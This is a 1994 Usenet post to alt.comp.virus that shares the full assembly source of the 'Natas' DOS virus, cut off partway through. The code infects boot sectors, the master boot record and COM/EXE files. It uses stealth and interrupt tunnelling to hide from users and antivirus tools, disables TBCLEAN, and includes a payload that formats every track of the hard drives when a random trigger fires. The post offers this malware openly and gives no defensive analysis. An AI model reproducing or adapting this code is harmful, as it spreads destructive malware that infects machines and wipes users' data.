From netcom.com!ix.netcom.com!howland.reston.ans.net!sol.ctr.columbia.edu!news.mtu.edu!news.mtu.edu!not-for-mail Mon Nov 14 02:24:29 1994
Xref: netcom.com alt.comp.virus:240
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!sol.ctr.columbia.edu!news.mtu.edu!news.mtu.edu!not-for-mail
From: jdmathew@mtu.edu (Icepick)
Newsgroups: alt.comp.virus
Subject: NATAS
Date: 13 Nov 1994 18:54:19 -0500
Organization: Michigan Technological University
Lines: 2594
Message-ID: <3a68vb$l2o@maxwell11.ee>
NNTP-Posting-Host: maxwell11.ee.mtu.edu
X-Newsreader: TIN [version 1.2 PL1]

;Natas Virus
;COM/EXE/Boot sector/partition table/full Stealth and polymorphic
;Tunnels
;Does other stuff
;2 files -- v1eng.asm = virus  eng.asm = Engine


----------------<<v1eng.asm>>--------------------------------------------------

.model  tiny
.code

file_size       equ     file_end - v_start
sect_size       equ     (decrypt - v_start + 511) / 512
para_size       equ     (v_end - v_start + 15) / 16
kilo_size       equ     (v_end - v_start + 1023) / 1024

find_dos_13     equ     tracer_dos_13 - (trace_mode + 1)
find_13         equ     tracer_13 - (trace_mode + 1)
find_15         equ     tracer_15 - (trace_mode + 1)
find_21         equ     tracer_21 - (trace_mode + 1)
find_40         equ     tracer_40 - (trace_mode + 1)
step_21         equ     tracer_step_21 - (trace_mode + 1)

loader_size     equ     loader_end - loader

no_hook_21      equ     new_13_next - (hook_21 + 1)
yes_hook_21     equ     check_21 - (hook_21 + 1)

boot            equ     0
file            equ     1

years           equ     100 shl 1


v_start:        jmp     decrypt
                
                ; push    cs
                ; pop     ds
                ; call    copy_ints
                dw      copy_ints - ($ + 2)     ; save ints 13 15 21 40
                mov     ds:hook_21,al           ; (0=yes_hook_21) hook 21h
                mov     ds:origin,al            ; (0=boot) remeber host
                mov     es,ax                   ; ES=0
                pop     di
                sub     di,3                    ; address of loader in boot
                push    ax di                   ; save return address 0:xxxx
                mov     si,offset boot_code
                call    move_boot_code1         ; copy and decode boot code
                mov     al,13h
                mov     dx,offset new_13
                call    set_int                 ; hook int 13h
                call    inf_hard                ; infect drive C:
                test    byte ptr ds:load_head,dl ; DL=80h drive C:?
                je      boot_retf
                mov     ax,1ffh
                call    random                  ; time to activate?
                jne     boot_retf
                jmp     kill_disk

boot_retf:      retf                            ; return to boot sector
                
;=====( Copy boot code and (en/de)crypt it )=================================;

move_boot_code1:mov     ah,ds:[si - 1]          ; get key
move_boot_code: mov     cx,loader_size
                cld
move_boot_loop: lodsb
                xor     al,ah                   ; code/decode
                rol     ah,1
                stosb
                loop    move_boot_loop
                retn
                
;=====( Code that was in boot sector before infection )======================;

boot_code_key   db      ?
boot_code:      db      loader_size dup(?)

;=====( Gets inserted into infected Boot sectors/MBRs )======================;

loader:         call    $ + 3
                mov     di,40h
                mov     ds,di
                sub     word ptr ds:[di-(40h-13h)],kilo_size ; hide memory
                mov     ax,ds:[di-(40h-13h)]
                mov     cl,0ah
                ror     ax,cl                   ; get TOM address
                mov     es,ax
                mov     ax,200h + sect_size
                xor     bx,bx
                mov     cx,0
load_sect       =       $ - 2
                mov     dx,0
load_head       =       $ - 2
                int     13h                     ; read code into memory
                jb      load_fail
                push    es bx                   ; address of high code
                retf
load_fail:      int     18h
loader_end:

;=====( save ints 13h, 15h, 21h & 40h. Assumes ES=CS )=======================;

copy_ints:      push    ds
                xor     ax,ax
                mov     ds,ax                   ; segment 0
                mov     si,13h * 4h
                mov     di,offset int_13
                push    si si
                movsw
                movsw                           ; int 13h to int_13
                pop     si
                movsw
                movsw                           ; int 13h to dos_13
                mov     si,15h * 4h
                movsw
                movsw                           ; int 15h to int_15
                pop     si                      ; address of int 13h's IVT
                cmp     byte ptr ds:[475h],al   ; any hard disks?
                je      copy_int_40
                mov     si,40h * 4h
copy_int_40:    movsw
                movsw                           ; copy int 13h/40h to int_40
                mov     si,21h * 4h
                movsw
                movsw                           ; int 21h to int_21
                pop     ds
                retn

;=====( get interrupt address )==============================================;

get_int:        push    ax
                xor     ah,ah
                rol     ax,1
                rol     ax,1
                xchg    bx,ax
                xor     ax,ax
                mov     es,ax
                les     bx,es:[bx]              ; get int address
                pop     ax
                retn

;=====( Set interrupt address )==============================================;

set_int:        push    ax bx ds
                xor     ah,ah
                rol     ax,1
                rol     ax,1
                xchg    ax,bx
                xor     ax,ax
                push    ds
                mov     ds,ax
                mov     ds:[bx],dx
                pop     ds:[bx + 2]
                pop     ds bx ax
                retn
                

push_all:       pop     cs:push_pop_ret
                pushf
                push    ax bx cx dx bp si di ds es
                mov     bp,sp
push_pop_jmp:   jmp     cs:push_pop_ret

pop_all:        pop     cs:push_pop_ret
                pop     es ds di si bp dx cx bx ax
                popf
                jmp     push_pop_jmp

;=====( Infect Drive C: )====================================================;

inf_hard:       push    cs cs
                pop     es ds
                mov     ax,201h
                mov     bx,offset disk_buff
                mov     cx,1
                mov     dx,80h
                call    call_13                 ; read MBR of drive C:
                jb      cant_inf_hard
                cmp     ds:[bx.pt_start_head],ch ; Jackal?
                je      cant_inf_hard
                mov     cx,ds:[bx.pt_end_sector_track]
                and     cx,0000000000111111b    ; get sector count
                sub     cx,sect_size
                jbe     cant_inf_hard
                cmp     cl,1                    ; too few sectors?
                jbe     cant_inf_hard
                call    copy_loader             ; copy loader into MBR
                jb      cant_inf_hard
                push    bx
                mov     ax,300h + sect_size
                xor     bx,bx
                call    call_13                 ; write code to hidden sectors
                pop     bx
                jb      cant_inf_hard
                mov     ax,301h
                mov     cl,1
                call    call_13                 ; write infected MBR
cant_inf_hard:  retn   

;=====( Copy Loader into disk_buff (BX) )====================================;

copy_loader:    push    cx dx
                cmp     word ptr ds:[bx+1feh],0aa55h    ; valid boot code?
                jne     copy_load_no
                mov     di,offset boot_code
                mov     ds:[di+load_sect-boot_code],cx  ; save track/sector
                and     dl,80h                          ; Drive C: or A:
                mov     ds:[di+load_head-boot_code],dx  ; save head/disk
                call    find_boot               ; find code/already infected?
                je      copy_load_no
                call    random_1                ; get random key
                mov     ds:[di - 1],ah          ; save key at boot_code_key
                push    si
                call    move_boot_code          ; save boot code and encrypt
                mov     si,di                   ; offset of loader
                pop     di                      ; boot code pointer
                mov     cx,loader_size
                rep     movsb                   ; copy loader into boot sect
                clc
                mov     al,0
                org     $ - 1
copy_load_no:   stc
                pop     dx cx
                retn   
                
;=====( Find start of boot sector's code )===================================;

find_boot:      mov     si,bx
                cld
                lodsb                           ; get 1st instruction
                push    ax
                lodsw                           ; Jump displacement (if jump)
                xchg    cx,ax
                pop     ax
                cmp     al,0ebh                 ; Short jump?
                jne     find_boot_jump
                xor     ch,ch                   ; 8bit jump
                dec     si
                jmp     find_boot_add
find_boot_jump: cmp     al,0e9h                 ; Near Jump?
                je      find_boot_add
find_boot_noadd:xor     cx,cx                   ; No displacement
                mov     si,bx
find_boot_add:  add     si,cx                   ; si=start of boot code
                cmp     si,offset (disk_buff+200h) - (loader_size + 5) 
                                                ; jump out of range?
                jnb     find_boot_noadd
                cmp     word ptr ds:[si],00e8h  ; CALL -> already infected
                jne     find_boot_ret
                cmp     word ptr ds:[si+2],0bf00h ; 00 MOV DI -> already inf
find_boot_ret:  retn

;=====( Disable TBCLEAN )====================================================;

anti_tbclean:   xor     ax,ax
                pushf
                pop     dx
                and     dh,not 1                ; TF off
                push    dx dx
                popf
                push    ss
                pop     ss
                pushf                           ; Not trapped
                pop     dx
                test    dh,1                    ; TF set?
                pop     dx
                je      anti_tb_ret
                push    es
                xor     bp,bp
                mov     cx,ss
                cli
                mov     ss,bp                   ; segment 0
                les     di,ss:[bp+1h*4h]        ; address of int 1h
                mov     ss,cx
                sti
                mov     al,0cfh
                cld
                stosb                           ; IRET -> Int 1h
                pop     es
                push    dx
                popf
anti_tb_ret:    xchg    bp,ax                   ; save result
                retn

;=====( Swap jump into DOS' int 13h )========================================;

swap_13:        call    push_all
                mov     si,offset jump_code_13
                les     di,cs:[si+dos_13-jump_code_13]  ; get address in DOS
                jmp     swap_code

;=====( Swap jump into DOS' int 21h )========================================;

swap_21:        call    push_all
                mov     si,offset jump_code_21
                les     di,cs:[si+int_21-jump_code_21]
swap_code:      push    cs
                pop     ds
                mov     cx,5
                cmp     ds:origin,ch            ; 0 -> Boot origin, no tunnel
                je      swap_end
                cld
swap_loop:      lodsb
                xchg    al,es:[di]
                mov     ds:[si-1],al
                inc     di
                loop    swap_loop
swap_end:       call    pop_all
                retn

;=====( Find original interrupt entry points )===============================;

find_ints:      call    copy_ints               ; get interrupt addresses
                mov     ah,52h
                int     21h
                mov     ax,es:[bx-2]
                mov     ds:dos_seg,ax           ; 1st MCB segment
                mov     al,1h
                call    get_int                 ; get address of int 1h
                push    bx es
                mov     dx,offset tracer
                call    set_int                 ; hook int 1h
                pushf
                pop     si
                mov     di,offset trace_mode
                mov     byte ptr ds:[di],find_dos_13  ; find int 13h in DOS
                                                      ; and BIOS
                mov     ah,1h
                call    si_tf                   ; set TF
                call    call_13
                mov     byte ptr ds:[di],find_15 ; find int 15h in BIOS
                mov     ah,0c0h
                call    si_tf                   ; set TF
                pushf
                call    ds:int_15   
                mov     byte ptr ds:[di],find_21 ; find int 21h in DOS
                mov     ah,30h
                call    si_tf                   ; set TF
                call    call_21
                mov     byte ptr ds:[di],find_40 ; find int 40h in BIOS
                mov     ah,1
                call    si_tf                   ; set TF
                call    call_40
                and     si,not 100h
                push    si
                popf                            ; disable Trapping
                pop     ds dx
                mov     al,1
                call    set_int                 ; unhook int 1h
                retn

;=====( Set TF in SI, then set flags to SI )=================================;

si_tf:          or      si,100h
                push    si
                popf
                retn

;=====( Tracing/Tunneling )==================================================;

tracer:         push    ds
                push    cs
                pop     ds
                mov     ds:old_di,di
                mov     di,offset old_ax
                mov     ds:[di],ax
                mov     ds:[di+old_bx-old_ax],bx
                mov     ds:[di+old_cx-old_ax],cx
                mov     ds:[di+old_dx-old_ax],dx
                pop     ds:[di-(old_ax-old_ds)]
                pop     bx cx dx                ; get IP, CS and Flags
                mov     ax,cs
                cmp     ax,cx                   ; In our CS?
                jne     $
trace_mode      =       byte ptr $ - 1
                jmp     tracer_iret

tracer_dos_13:  cmp     cx,ds:dos_seg           ; in DOS code?
                jnb     tracer_cont
                mov     di,offset dos_13
                mov     ds:trace_mode,find_13   ; find it in BIOS next
                jmp     tracer_save_f

tracer_21:      cmp     cx,1234h                ; In DOS code?
dos_seg         =       word ptr $ - 2
                jnb     tracer_cont
                mov     di,offset int_21
tracer_save:    and     dh,not 1                ; TF off
tracer_save_f:  mov     ds:[di],bx
                mov     ds:[di + 2],cx          ; save address of int
                jmp     tracer_cont

tracer_15:      mov     di,offset int_15
                jmp     tracer_bios

tracer_40:      mov     di,offset int_40
                jmp     tracer_bios
                
tracer_13:      mov     di,offset int_13
tracer_bios:    cmp     ch,0c8h                 ; Below BIOS?
                jb      tracer_cont
                cmp     ch,0f4h                 ; Above BIOS?
                jb      tracer_save
                jmp     tracer_cont

tracer_step_21: dec     ds:inst_count           ; down counter
                jne     tracer_cont
                push    dx
                mov     al,1
                lds     dx,ds:int_1             ; get int 1h address
                call    set_int
                call    swap_21                 ; insert int 21h jump
                pop     dx
                and     dh,not 1h               ; TF off

tracer_cont:    test    dh,1                    ; TF on?
                je      tracer_iret
get_inst:       mov     ds,cx                   ; instruction CS
                xor     di,di
get_inst1:      mov     ax,ds:[bx + di]         ; get instruction
                cmp     al,0f0h                 ; LOCK
                je      skip_prefix
                cmp     al,0f2h                 ; REPNE
                je      skip_prefix
                cmp     al,0f3h                 ; REPE?
                je      skip_prefix
                cmp     al,9ch                  ; PUSHF or above?
                jae     emulate_pushf
                and     al,11100111b            ; 26,2e,36,3e = 26
                cmp     al,26h                  ; Segment Prefix?
                jne     tracer_iret
skip_prefix:    inc     di
                jmp     get_inst1

emulate_pushf:  jne     emulate_popf
                and     dh,not 1                ; TF off
                push    dx                      ; fake PUSHF
emulate_next:   lea     bx,ds:[bx + di + 1]     ; skip instruction
emulate_tf:     or      dh,1                    ; TF on
                jmp     get_inst

emulate_popf:   cmp     al,9dh                  ; POPF?
                jne     emulate_iret
                pop     dx                      ; fake POPF
                jmp     emulate_next

emulate_iret:   cmp     al,0cfh                 ; IRET?
                jne     emulate_int
                pop     bx cx dx                ; fake IRET
                jmp     emulate_tf

emulate_int:    cmp     al,0cdh                 ; Int xx
                je      emulate_int_xx
                cmp     al,0cch                 ; Int 3?
                mov     ah,3
                je      emulate_int_x
                cmp     al,0ceh                 ; Into?
                mov     ah,4
                jne     tracer_iret
                test    dh,8                    ; OF set?
                je      tracer_iret
emulate_int_x:  dec     bx                      ; [bx+di+2-1]
emulate_int_xx: and     dh,not 1                ; TF off
                lea     bx,ds:[bx + di + 2]     ; get return address
                push    dx cx bx                ; fake Int
                mov     al,ah                
                push    es
                call    get_int                 ; get interrupt address
                mov     cx,es
                pop     es
                jmp     emulate_tf

tracer_iret:    push    dx cx bx                ; save flags, cs & ip
                mov     ax,0
old_ds          =       word ptr $ - 2
                mov     ds,ax
                mov     ax,0
old_ax          =       word ptr $ - 2
                mov     bx,0
old_bx          =       word ptr $ - 2
                mov     cx,0
old_cx          =       word ptr $ - 2
                mov     dx,0
old_dx          =       word ptr $ - 2
                mov     di,0
old_di          =       word ptr $ - 2
                iret

;=====( file infections come here after decryption )=========================;

file_start:     push    ds                      ; save PSP segment
                call    $ + 3
                pop     si
                sub     si,offset $ - 1
                call    anti_tbclean            ; disable TBCLEAN
                or      bp,bp                   ; TBCLEAN active?
                jne     go_res
                mov     ah,30h
                mov     bx,-666h
                int     21h
                cmp     al,3h                   ; must be DOS 3+
                jb      jump_host
go_res:         mov     ax,es
                dec     ax
                mov     ds,ax
                xor     di,di
                or      bp,bp                   ; TBCLEAN here?
                jne     dont_check_mcb
                cmp     byte ptr ds:[di],'Z'    ; Last Block?
                jne     jump_host
dont_check_mcb: mov     ax,para_size
                sub     ds:[di + 3],ax          ; from MCB
                sub     ds:[di + 12h],ax        ; from PSP
                mov     es,ds:[di + 12h]        ; get memory address
                mov     ds,di
                sub     word ptr ds:[413h],kilo_size ; from int 12h
                mov     cx,jump_code_13-v_start
                cld
                rep     movs byte ptr es:[di],byte ptr cs:[si]  
                mov     ax,offset high_code
                push    es ax
                retf

jump_host:      push    cs
                pop     ds
                pop     es                      ; PSP segment
                lea     si,ds:[si + header]     ; get address of header
                mov     ax,ds:[si]              ; get 1st instruction
                cmp     ax,'ZM'                 ; EXE?
                je      jump_2_exe
                cmp     ax,'MZ'                 ; EXE?
                je      jump_2_exe
                mov     cx,18h / 2
                mov     di,100h
                push    es di
                cld
                rep     movsw                   ; repair .COM file
                push    es
                pop     ds
                xchg    ax,cx
                retf
                
jump_2_exe:     mov     ax,es
                add     ax,10h
                add     ds:[si.eh_cs],ax
                add     ax,ds:[si.eh_ss]        ; get SS/CS
                push    es
                pop     ds
                cli
                mov     ss,ax
                mov     sp,cs:[si.eh_sp]
                xor     ax,ax
                sti
                jmp     dword ptr cs:[si.eh_ip]


high_code:      push    cs
                pop     ds
                mov     byte ptr ds:[di+origin-jump_code_13],file ; tunnel      
                mov     ax,2
                call    random                  ; 1 in 3 chance of no stealth
                                                ; on special programs
                mov     ds:check_special,al
                mov     ds:hook_21,no_hook_21   ; dont hook int 21h
                mov     al,0eah
                stosb                           ; store at jump_code_13
                mov     ds:[di+4],al
                mov     ax,offset new_13
                stosw
                mov     word ptr ds:[di+3],offset new_21
                mov     ds:[di],cs
                mov     ds:[di+5],cs
                push    di
                call    find_ints               ; trace interrupts
                pop     di
                push    cs
                pop     ds
                mov     ax,ds:dos_seg
                cmp     word ptr ds:[di+(dos_13+2)-(jump_code_13+3)],ax 
                                                ; found DOS' int 13h?
                ja      call_inf_hard
                cmp     word ptr ds:[di+(int_21+2)-(jump_code_13+3)],ax            
                                                ; found DOS' int 21h?
                ja      call_inf_hard
                call    swap_13
                call    swap_21                 ; insert jumps into DOS
call_inf_hard:  call    inf_hard                ; infect drive C:
                or      bp,bp                   ; ZF -> No TBCLEAN
                mov     si,bp                   ; SI=0 if goto jump_host
                jne     kill_disk
                jmp     jump_host

kill_disk:      xor     bx,bx
                mov     es,bx                   ; table to use for format
                mov     dl,80h                  ; Drive C:
kill_next_disk: xor     dh,dh                   ; head 0
kill_next_track:xor     cx,cx                   ; track 0             
kill_format:    mov     ax,501h
                call    call_disk               ; format track
                and     cl,11000000b
                inc     ch                      ; next track low
                jne     kill_format
                add     cl,40h                  ; next track high
                jne     kill_format
                xor     ah,ah
                int     13h                     ; reset disk
                inc     dh                      ; next head
                cmp     dh,10h
                jb      kill_next_track
                inc     dx                      ; next drive
                jmp     kill_next_disk

;=====( Interrupt 13h handler )==============================================;

new_13:         jmp     $
hook_21         =       byte ptr $ - 1

check_21:       call    push_all
                mov     al,21h
                call    get_int                 ; get int 21h address
                mov     ax,es
                push    cs cs
                pop     ds es
                cmp     ax,800h                 ; too high?
                ja      cant_hook_21
                mov     di,offset int_21 + 2
                std
                xchg    ax,ds:[di]              ; swap addresses
                scasw                           ; did it change?
                je      cant_hook_21
                mov     ds:[di],bx
                mov     al,21h
                mov     dx,offset new_21
                call    set_int                 ; hook int 21h
                mov     ds:hook_21,no_hook_21
cant_hook_21:   call    pop_all

new_13_next:    cmp     ah,2h                   ; Read?
                jne     jump_13
                cmp     cx,1                    ; track 0, sector 1?
                jne     jump_13
                or      dh,dh                   ; head 0?
                je      hide_boot
jump_13:        call    call_dos_13
                retf    2h


hide_boot:      call    call_dos_13             ; read boot sector
                call    push_all
                jb      hide_boot_err
                push    es cs
                pop     es ds
                mov     cx,100h
                mov     si,bx
                mov     di,offset disk_buff
                mov     bx,di
                cld
                rep     movsw                   ; copy boot sector to buffer
                push    cs
                pop     ds
                call    find_boot               ; find start/already infected?
                jne     inf_boot
                mov     ax,201h
                mov     cx,ds:[si+load_sect-loader]
                mov     dh,byte ptr ds:[si+(load_head+1)-loader]
                                                ; get code location
                call    call_disk               ; read virus code
                jb      hide_boot_err
                mov     ax,ds:[0]
                cmp     ds:[bx],ax              ; verify infection
                jne     hide_boot_err
                mov     di,ss:[bp.reg_bx]
                mov     es,ss:[bp.reg_es]       ; get caller's buffer
                sub     si,bx                   ; displacement into boot sect.
                add     di,si                   ; address of loader
                lea     si,ds:[bx+(boot_code-v_start)] ; boot code in virus
                call    move_boot_code1         ; hide infection
hide_boot_err:  call    pop_all
                retf    2h

inf_boot:       cmp     dl,80h                  ; hard disk?
                jnb     hide_boot_err
                mov     ax,301h
                mov     cx,1
                call    call_disk               ; Write boot sector to disk
                                                ; CY -> Write-Protected
                jb      hide_boot_err
                mov     si,dx                   ; save drive #
                mov     di,bx
                mov     ax,ds:[di.bs_sectors]   ; get number of sectors
                mov     cx,ds:[di.bs_sectors_per_track]
                sub     ds:[di.bs_sectors],cx   ; prevent overwriting of code
                mov     ds:hide_count,cx
                xor     dx,dx
                or      ax,ax                   ; error?
                je      hide_boot_err
                jcxz    hide_boot_err
                div     cx
                or      dx,dx                   ; even division?
                jne     hide_boot_err
                mov     bx,ds:[di.bs_heads]     ; get number of heads
                or      bx,bx
                je      hide_boot_err
                div     bx
                or      dx,dx
                jne     hide_boot_err
                dec     ax
                mov     ch,al                   ; last track
                mov     cl,1                    ; sector 1
                dec     bx
                mov     dx,si                   ; drive
                mov     dh,bl                   ; last head
                mov     bx,di                   ; offset disk buffer
                call    copy_loader             ; Copy loader into Boot sector
                jb      hide_boot_err
                mov     ax,300h + sect_size
                xor     bx,bx
                call    call_disk
                jb      hide_boot_err
                mov     ax,301h
                mov     bx,offset disk_buff
                mov     cx,1
                xor     dh,dh
                call    call_disk               ; write boot sector to disk
                mov     bx,ss:[bp.reg_bx]
                mov     ds,ss:[bp.reg_es]       ; get caller's buffer
                sub     ds:[bx.bs_sectors],9ffh ; prevent overwriting of code
hide_count      =       word ptr $ - 2
                jmp     hide_boot_err

;=====( Interrupt 21h handler )==============================================;

new_21:         cli
                mov     cs:int_21_ss,ss
                mov     cs:int_21_sp,sp         ; save stack pointers
                push    cs
                pop     ss
                mov     sp,offset temp_stack    ; allocate stack
                sti
                call    push_all
                in      al,21h
                or      al,2                    ; disable keyboard
                out     21h,al
                push    cs
                pop     ds
                mov     di,offset new_24
                mov     word ptr ds:[di-(new_24-handle)],bx ; save handle
                mov     al,24h
                call    get_int                 ; get address of int 24h
                mov     word ptr ds:[di-(new_24-int_24)],bx
                mov     word ptr ds:[di-(new_24-(int_24+2))],es
                mov     word ptr ds:[di],03b0h  ; MOV AL,3
                mov     byte ptr ds:[di+2],0cfh ; IRET
                mov     dx,di
                call    set_int                 ; hook int 24h
                call    pop_all
                call    swap_21                 ; remove jump from int 21h
                call    push_all
                cmp     ah,30h                  ; get DOS version?
                jne     is_dir_fcb
                add     bx,666h                 ; looking for us?
                jnz     is_dir_fcb
                mov     ss:[bp.reg_ax],bx       ; set DOS version=0
                mov     ss:[bp.reg_bx],bx
                jmp     retf_21

is_dir_fcb:     cmp     ah,11h
                jb      is_dir_asciiz
                cmp     ah,12h
                ja      is_dir_asciiz
                call    call_21                 ; do find
                or      al,al                   ; error?
                je      dir_fcb
                jmp     jump_21

dir_fcb:        call    save_returns            ; save AX
                call    get_psp                 ; get current PSP
                mov     ax,'HC'
                scasw                           ; CHKDSK?
                jne     dir_fcb_ok
                mov     ax,'DK'
                scasw
                jne     dir_fcb_ok
                mov     ax,'KS'
                scasw
                je      retf_21
dir_fcb_ok:     call    get_dta                 ; get DTA address
                xor     di,di
                cmp     byte ptr ds:[bx],-1     ; extended FCB?
                jne     dir_fcb_next
                mov     di,7h                   ; fix it up
dir_fcb_next:   lea     si,ds:[bx+di.ds_date+1] ; offset of year -> SI
dir_hide:       call    is_specialfile          ; no stealth if helper
                je      retf_21
                cmp     byte ptr ds:[si],years  ; infected?
                jc      retf_21
                sub     byte ptr ds:[si],years  ; restore old date
                les     ax,ds:[bx+di.ds_size]   ; get size of file
                mov     cx,es
                sub     ax,file_size            ; hide size increase
                sbb     cx,0
                jc      retf_21
                mov     word ptr ds:[bx+di.ds_size],ax
                mov     word ptr ds:[bx+di.ds_size+2],cx ; save new size
retf_21:        call    undo_24                 ; unhook int 24h
                call    pop_all
                call    swap_21                 ; insert jump
                cli
                mov     ss,cs:int_21_ss
                mov     sp,cs:int_21_sp
                sti
                retf    2

                
is_dir_asciiz:  cmp     ah,4eh
                jb      is_lseek
                cmp     ah,4fh
                ja      is_lseek
                call    call_21
                jnc     dir_asciiz    
go_jump_21:     jmp     jump_21

dir_asciiz:     call    save_returns            ; save AX and flags
                call    get_dta                 ; get dta address
                mov     di,-3
                lea     si,ds:[bx.dta_date+1]   ; get year address
                jmp     dir_hide

is_lseek:       cmp     ax,4202h                ; Lseek to end?
                jne     is_date
                call    call_21_file
                jb      go_jump_21
                call    get_dcb                 ; get DCB address
                jbe     lseek_exit
                call    is_specialfile          ; dont hide true size from
                                                ; helpers
                je      lseek_exit
                sub     ax,file_size
                sbb     dx,0                    ; hide virus at end
                mov     word ptr ds:[di.dcb_pos],ax
                mov     word ptr ds:[di.dcb_pos+2],dx ; set position in DCB
lseek_exit:     clc
                call    save_returns            ; save AX/flags
                mov     ss:[bp.reg_dx],dx
                jmp     retf_21

is_date:        cmp     ax,5700h                ; get date?
                je      get_date
                cmp     ax,5701h                ; set date?
                jne     is_read
                call    get_dcb
                jbe     date_err
                cmp     dh,years                ; already setting 100 years?
                jnb     date_err
                add     dh,years                ; dont erase marker
get_date:       call    is_specialfile          ; do not hide date for
                                                ; helpers
                je      date_err
                call    call_21_file            ; get/set date
                jnc     date_check
date_err:       jmp     jump_21

date_check:     cmp     dh,years                ; infected?
                jb      date_ok
                sub     dh,years
date_ok:        clc
                call    save_returns            ; save ax/flags
                mov     ss:[bp.reg_cx],cx
                mov     ss:[bp.reg_dx],dx       ; save time/date
                jmp     retf_21
                
is_read:        cmp     ah,3fh                  ; reading file?
                je      do_read
no_read:        jmp     is_write

do_read:        call    get_dcb                 ; get DCB address
                jbe     no_read
                call    is_specialfile
                je      no_read
                les     ax,ds:[di.dcb_size]     ; get size of file                                
                mov     bx,es
                les     dx,ds:[di.dcb_pos]      ; get current position
                mov     si,es
                and     cs:read_bytes,0
                or      si,si                   ; in 1st 64k?
                jnz     read_high
                cmp     dx,18h                  ; reading header?
                jnb     read_high
                push    cx
                add     cx,dx
                cmc
                jnc     read_above
                cmp     cx,18h                  ; read goes above header?
read_above:     pop     cx
                jb      read_below
                mov     cx,18h
                sub     cx,dx
read_below:     push    ax bx                   ; save size
                push    dx                      ; position
                sub     dx,18h
                add     ax,dx                   ; get position in header
                cmc
                sbb     bx,si
                xchg    word ptr ds:[di.dcb_pos],ax
                xchg    word ptr ds:[di.dcb_pos+2],bx ; lseek to header
                push    ax bx
                push    ds
                mov     ah,3fh                
                mov     dx,ss:[bp.reg_dx]
                mov     ds,ss:[bp.reg_ds]
                call    call_21_file            ; read file
                pop     ds
                pop     word ptr ds:[di.dcb_pos+2]
                pop     word ptr ds:[di.dcb_pos]
                pop     dx
                pushf
                add     dx,ax                   ; adjust position
                add     cs:read_bytes,ax        ; remember # of bytes read
                popf
                pop     bx ax
                jnc     read_high
                jmp     jump_21

read_high:      mov     word ptr ds:[di.dcb_pos],dx ; update position
                mov     word ptr ds:[di.dcb_pos+2],si
                mov     cx,ss:[bp.reg_cx]       ; number of bytes to read
                sub     cx,cs:read_bytes
                sub     ax,file_size
                sbb     bx,0                    ; get original size
                push    ax bx
                sub     ax,dx
                sbb     bx,si                   ; in virus now?
                pop     bx ax
                jnc     read_into
                xor     cx,cx                   ; read 0 bytes
                jmp     read_fake

read_into:      add     dx,cx
                adc     si,0                    ; get position after read
                cmp     bx,si                   ; read extends into virus?
                ja      read_fake
                jb      read_adjust
                cmp     ax,dx
                jnb     read_fake
read_adjust:    sub     dx,cx                   ; get position again
                xchg    cx,ax
                sub     cx,dx   ; # of bytes to read = Original size - Pos
read_fake:      mov     ah,3fh
                mov     dx,ss:[bp.reg_dx]
                add     dx,cs:read_bytes
                mov     ds,ss:[bp.reg_ds]
                call    call_21_file            ; read file
                jc      read_exit
                add     ax,0
read_bytes      =       word ptr $ - 2
                clc
read_exit:      call    save_returns
                jmp     retf_21
                

is_write:       cmp     ah,40h                  ; write?
                je      do_write
no_write:       jmp     is_infect

do_write:       call    get_dcb
                jbe     no_write
                les     ax,ds:[di.dcb_size]     ; get file size
                mov     bx,es
                sub     ax,18h
                sbb     bx,0                    ; get header position
                xchg    ax,word ptr ds:[di.dcb_pos]
                xchg    bx,word ptr ds:[di.dcb_pos+2] ; lseek to header
                push    ax bx
                mov     ax,2
                xchg    ax,ds:[di.dcb_mode]     ; read/write mode
                push    ax
                push    ds cs
                pop     ds es
                call    read_header             ; read 18h bytes
                pop     es:[di.dcb_mode]        ; restore access mode
                jc      write_rest_pos
                mov     word ptr es:[di.dcb_pos],ax
                mov     word ptr es:[di.dcb_pos+2],ax ; lseek to start
                call    write_header                  ; write old header
                jc      write_rest_pos
                push    es
                pop     ds
                sub     word ptr ds:[di.dcb_size],file_size
                sbb     word ptr ds:[di.dcb_size+2],ax    ; truncate at virus
                sub     byte ptr ds:[di.dcb_date+1],years ; remove 100 years
write_rest_pos: pop     word ptr es:[di.dcb_pos+2]
                pop     word ptr es:[di.dcb_pos]
                jmp     jump_21


is_infect:      cmp     ah,3eh                  ; Close?
                je      infect_3e
                cmp     ax,4b00h                ; Execute?
                je      infect_4b
                jmp     jump_21

infect_4b:      mov     ax,3d00h                ; Open file
                cmp     ax,0
                org     $ - 2
infect_3e:      mov     ah,45h                  ; Duplicate handle
                call    int_2_bios              ; lock out protection programs
                call    call_21_file            ; get handle
                mov     cs:handle,ax
                mov     ax,4408h
                cwd
                jc      undo_bios
                call    get_dcb                 ; get DCB for handle
                jb      cant_infect
                jne     cant_infect             ; error/already infected
                mov     bl,00111111b
                and     bl,byte ptr ds:[di.dcb_dev_attr] ; get drive code
                mov     dl,bl                   ; DX=00**
                inc     bx                      ; 0=default,1=a,2=b,3=c,etc.
                call    call_21                 ; drive removable?
                mov     cx,1h
                push    cs
                pop     es
                jc      test_prot_drive
                dec     ax                      ; 1=non-removable
                jz      no_protect
                jmp     test_protect

test_prot_drive:cmp     dl,1                    ; A or B?
                ja      no_protect
test_protect:   mov     ax,201h
                mov     bx,offset disk_buff
                int     13h                     ; read sector
                jc      cant_infect
                mov     ax,301h
                int     13h                     ; write it back
                jc      cant_infect
no_protect:     inc     cx                      ; CX=2
                xchg    cx,ds:[di.dcb_mode]     ; read/write access mode
                push    cx
                xor     ax,ax
                xchg    ah,ds:[di.dcb_attr]     ; attribute=0
                test    ah,00000100b            ; system file?
                push    ax
                jne     cant_system
                cbw
                cwd
                xchg    ax,word ptr ds:[di.dcb_pos]
                xchg    dx,word ptr ds:[di.dcb_pos+2] ; lseek to 0
                push    ax dx
                mov     bp,-'OC'
                add     bp,word ptr ds:[di.dcb_ext]   ; BP=0 of CO
                jnz     not_com
                mov     bp,-'MO'
                add     bp,word ptr ds:[di.dcb_ext+1] ; BP=0 if OM
not_com:        call    infect
                pushf
                call    get_dcb
                popf
                jc      not_infected
                add     byte ptr ds:[di.dcb_date+1],years   ; add 100 years
not_infected:   or      byte ptr ds:[di.dcb_dev_attr+1],40h ; no time/date
                pop     word ptr ds:[di.dcb_pos+2]
                pop     word ptr ds:[di.dcb_pos]
cant_system:    pop     word ptr ds:[di.dcb_attr-1] ; restore attribute
                pop     ds:[di.dcb_mode]        ; restore access mode
cant_infect:    mov     ah,3eh
                call    call_21_file            ; close file
undo_bios:      call    int_2_bios              ; restore interrupts
                
;=====( Jump on to int 21h )=================================================;

